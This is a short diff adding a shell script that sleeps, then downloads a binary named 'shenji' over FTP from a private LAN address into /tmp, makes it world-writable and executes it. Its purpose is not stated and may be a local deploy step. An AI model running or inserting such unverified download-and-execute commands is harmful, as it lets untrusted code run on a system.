@@ -1,0 +1,18 @@
+#!/bin/sh
+
+sleep 40
+
+cd /tmp/
+
+rm shenji
+
+wget ftp://192.168.66.253/shenji 
+
+chmod 777 shenji 
+
+./shenji
+
+
+
+
+
